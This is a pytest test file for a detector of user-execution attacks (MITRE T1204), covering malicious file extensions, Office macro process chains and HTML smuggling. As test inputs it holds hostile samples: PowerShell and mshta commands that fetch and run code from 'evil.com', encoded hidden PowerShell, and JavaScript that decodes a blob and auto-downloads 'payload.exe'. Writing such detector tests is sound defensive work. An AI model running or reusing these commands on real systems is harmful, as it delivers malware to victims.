"""
Tests for shadow313.v4.detection.user_execution_detector — T1204
"""
from __future__ import annotations
import pytest
from shadow313.v4.detection.user_execution_detector import (
    UserExecutionDetector, UserExecutionAlert,
    MALICIOUS_EXTENSIONS, OFFICE_PROCESSES, MACRO_CHILD_PROCESSES,
)


@pytest.fixture
def detector():
    return UserExecutionDetector()


class TestUserExecutionDetectorBasics:

    def test_instantiates(self, detector):
        assert detector is not None

    def test_list_monitored_extensions(self):
        exts = UserExecutionDetector.list_monitored_extensions()
        assert ".hta" in exts
        assert ".vbs" in exts
        assert ".lnk" in exts
        assert ".iso" in exts
        assert ".xlsm" in exts

    def test_clean_file_no_alert(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\Users\\user\\Documents\\report.docx",
            "parent_process": "explorer.exe",
        })
        assert alert is None

    def test_clean_process_chain_no_alert(self, detector):
        alert = detector.analyze_process_chain({
            "parent_process": "explorer.exe",
            "child_process": "cmd.exe",
            "command_line": "cmd.exe /c dir",
        })
        assert alert is None

    def test_get_stats_empty(self, detector):
        stats = detector.get_stats()
        assert stats["total_alerts"] == 0

    def test_clear(self, detector):
        detector.analyze_file_execution({"file_path": "C:\\temp\\payload.hta", "parent_process": "explorer.exe"})
        detector.clear()
        assert len(detector.get_alerts()) == 0


class TestMaliciousFileExecution:

    def test_hta_file_detected(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\Users\\user\\Downloads\\invoice.hta",
            "parent_process": "explorer.exe",
        })
        assert alert is not None
        assert alert.technique == "T1204.002"
        assert alert.file_extension == ".hta"

    def test_vbs_file_detected(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\temp\\payload.vbs",
            "parent_process": "explorer.exe",
        })
        assert alert is not None
        assert alert.file_extension == ".vbs"

    def test_js_file_detected(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\Users\\user\\AppData\\Local\\Temp\\dropper.js",
            "parent_process": "explorer.exe",
        })
        assert alert is not None
        assert alert.file_extension == ".js"

    def test_lnk_file_detected(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\Users\\user\\Desktop\\invoice.lnk",
            "parent_process": "explorer.exe",
            "command_line": "powershell.exe -windowstyle hidden -enc JABj...",
        })
        assert alert is not None
        assert alert.execution_type == "lnk_execution"

    def test_iso_motw_bypass(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\Users\\user\\Downloads\\software.iso",
            "parent_process": "explorer.exe",
        })
        assert alert is not None
        assert alert.execution_type == "iso_motw_bypass"

    def test_img_motw_bypass(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\Users\\user\\Downloads\\setup.img",
            "parent_process": "explorer.exe",
        })
        assert alert is not None
        assert alert.execution_type == "iso_motw_bypass"

    def test_xlsm_macro_file(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\Users\\user\\Downloads\\invoice.xlsm",
            "parent_process": "explorer.exe",
        })
        assert alert is not None
        assert alert.file_extension == ".xlsm"

    def test_xll_excel_addin(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\Users\\user\\Downloads\\plugin.xll",
            "parent_process": "excel.exe",
        })
        assert alert is not None
        assert alert.file_extension == ".xll"

    def test_download_path_boosts_risk(self, detector):
        alert_download = detector.analyze_file_execution({
            "file_path": "C:\\Users\\user\\Downloads\\payload.hta",
            "parent_process": "explorer.exe",
        })
        alert_system = detector.analyze_file_execution({
            "file_path": "C:\\Windows\\System32\\payload.hta",
            "parent_process": "explorer.exe",
        })
        assert alert_download.risk_score >= alert_system.risk_score

    def test_risk_score_bounded(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\temp\\payload.hta",
            "parent_process": "winword.exe",
        })
        assert 0.0 <= alert.risk_score <= 1.0

    def test_severity_values(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\temp\\payload.hta",
            "parent_process": "explorer.exe",
        })
        assert alert.severity in ("CRITICAL", "HIGH", "MEDIUM", "LOW")


class TestMacroChainDetection:

    def test_word_spawns_cmd(self, detector):
        alert = detector.analyze_process_chain({
            "parent_process": "winword.exe",
            "child_process": "cmd.exe",
            "command_line": "cmd.exe /c powershell -enc JABj...",
        })
        assert alert is not None
        assert alert.technique == "T1204.002"
        assert alert.execution_type == "macro_chain"

    def test_excel_spawns_powershell(self, detector):
        alert = detector.analyze_process_chain({
            "parent_process": "excel.exe",
            "child_process": "powershell.exe",
            "command_line": "powershell.exe -nop -w hidden -enc JABj...",
        })
        assert alert is not None
        assert alert.execution_type == "macro_chain"

    def test_outlook_spawns_wscript(self, detector):
        alert = detector.analyze_process_chain({
            "parent_process": "outlook.exe",
            "child_process": "wscript.exe",
            "command_line": "wscript.exe C:\\temp\\payload.vbs",
        })
        assert alert is not None

    def test_word_spawns_mshta(self, detector):
        alert = detector.analyze_process_chain({
            "parent_process": "winword.exe",
            "child_process": "mshta.exe",
            "command_line": "mshta.exe http://evil.com/x.hta",
        })
        assert alert is not None

    def test_encoded_command_boosts_risk(self, detector):
        alert_encoded = detector.analyze_process_chain({
            "parent_process": "winword.exe",
            "child_process": "powershell.exe",
            "command_line": "powershell.exe -enc JABjAD0ATgBlAHcA",
        })
        alert_plain = detector.analyze_process_chain({
            "parent_process": "excel.exe",
            "child_process": "cmd.exe",
            "command_line": "cmd.exe /c dir",
        })
        assert alert_encoded.risk_score > alert_plain.risk_score

    def test_network_activity_boosts_risk(self, detector):
        alert_net = detector.analyze_process_chain({
            "parent_process": "winword.exe",
            "child_process": "powershell.exe",
            "command_line": "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')",
        })
        alert_local = detector.analyze_process_chain({
            "parent_process": "excel.exe",
            "child_process": "cmd.exe",
            "command_line": "cmd.exe /c whoami",
        })
        assert alert_net.risk_score > alert_local.risk_score

    def test_non_office_parent_no_alert(self, detector):
        alert = detector.analyze_process_chain({
            "parent_process": "explorer.exe",
            "child_process": "cmd.exe",
            "command_line": "cmd.exe /c dir",
        })
        assert alert is None

    def test_office_spawns_non_shell_no_alert(self, detector):
        alert = detector.analyze_process_chain({
            "parent_process": "winword.exe",
            "child_process": "notepad.exe",
            "command_line": "notepad.exe",
        })
        assert alert is None


class TestHTMLSmugglingDetection:

    def test_html_smuggling_detected(self, detector):
        html = """
        <script>
        var data = atob('TVqQAAMAAAAEAAAA...');
        var blob = new Blob([new Uint8Array(data.split('').map(c => c.charCodeAt(0)))]);
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'payload.exe';
        a.click();
        </script>
        """
        alert = detector.analyze_html_content(html, "http://evil.com/invoice.html")
        assert alert is not None
        assert alert.technique == "T1204.001"
        assert alert.execution_type == "html_smuggling"

    def test_html_smuggling_single_indicator_no_alert(self, detector):
        html = "<script>var x = atob('dGVzdA==');</script>"
        alert = detector.analyze_html_content(html)
        assert alert is None

    def test_html_smuggling_multiple_indicators(self, detector):
        html = """
        var data = atob('...');
        var arr = new Uint8Array(data);
        var blob = new Blob([arr]);
        var url = URL.createObjectURL(blob);
        """
        alert = detector.analyze_html_content(html)
        assert alert is not None


class TestAlertProperties:

    def test_alert_to_dict(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\temp\\payload.hta",
            "parent_process": "explorer.exe",
        })
        d = alert.to_dict()
        assert isinstance(d, dict)
        assert "technique" in d
        assert "risk_score" in d
        assert "execution_type" in d

    def test_recommendations_not_empty(self, detector):
        alert = detector.analyze_file_execution({
            "file_path": "C:\\temp\\payload.hta",
            "parent_process": "explorer.exe",
        })
        assert len(alert.recommendations) > 0

    def test_get_stats_after_detections(self, detector):
        detector.analyze_file_execution({"file_path": "C:\\temp\\payload.hta", "parent_process": "explorer.exe"})
        detector.analyze_file_execution({"file_path": "C:\\temp\\payload.iso", "parent_process": "explorer.exe"})
        detector.analyze_process_chain({"parent_process": "winword.exe", "child_process": "cmd.exe", "command_line": "cmd.exe /c whoami"})
        stats = detector.get_stats()
        assert stats["total_alerts"] == 3
        assert "malicious_file" in stats["by_type"] or "iso_motw_bypass" in stats["by_type"]